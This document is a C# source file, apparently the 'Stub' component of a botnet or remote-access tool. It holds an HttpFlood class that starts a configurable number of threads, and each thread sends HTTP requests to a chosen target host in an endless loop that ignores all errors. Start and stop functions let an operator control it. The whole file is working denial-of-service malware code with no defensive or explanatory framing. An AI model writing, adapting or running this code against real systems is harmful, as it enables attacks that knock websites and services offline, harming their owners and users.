namespace Stub
{
    using System;
    using System.Net;
    using System.Threading;

    internal class HttpFlood
    {
        private static ThreadStart[] FloodingJob;
        private static Thread[] FloodingThread;
        public static string Host;
        private static HttpRequest[] RequestClass;
        public static int Threads;

        public static void StartHttpFlood()
        {
            FloodingThread = new Thread[Threads];
            FloodingJob = new ThreadStart[Threads];
            RequestClass = new HttpRequest[Threads];
            for (int i = 0; i < Threads; i++)
            {
                RequestClass[i] = new HttpRequest(Host);
                FloodingJob[i] = new ThreadStart(RequestClass[i].Send);
                FloodingThread[i] = new Thread(FloodingJob[i]);
                FloodingThread[i].Start();
            }
        }

        public static void StopHttpFlood()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    FloodingThread[i].Suspend();
                }
                catch
                {
                }
            }
        }

        private class HttpRequest
        {
            private string Host;
            private WebClient Http = new WebClient();

            public HttpRequest(string Host)
            {
                this.Host = Host;
            }

            public void Send()
            {
            Label_0000:
                try
                {
                    this.Http.DownloadString(this.Host);
                    goto Label_0000;
                }
                catch
                {
                    goto Label_0000;
                }
            }
        }
    }
}

